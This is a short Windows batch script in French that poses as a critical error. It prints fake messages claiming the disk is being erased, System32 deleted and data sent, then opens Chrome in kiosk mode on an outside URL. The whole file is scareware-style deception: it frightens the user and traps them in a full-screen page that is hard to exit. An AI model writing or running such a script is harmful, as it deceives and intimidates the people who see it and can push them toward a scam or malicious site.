@echo off
title ERREUR CRITIQUE
color 0a
echo Initialisation de l'effacement du disque...
timeout /t 2 >nul
echo Suppression de C:\Windows\System32...
timeout /t 2 >nul
echo Envoi des données...
timeout /t 2 >nul
start chrome --kiosk "https://member-cleanup.vercel.app"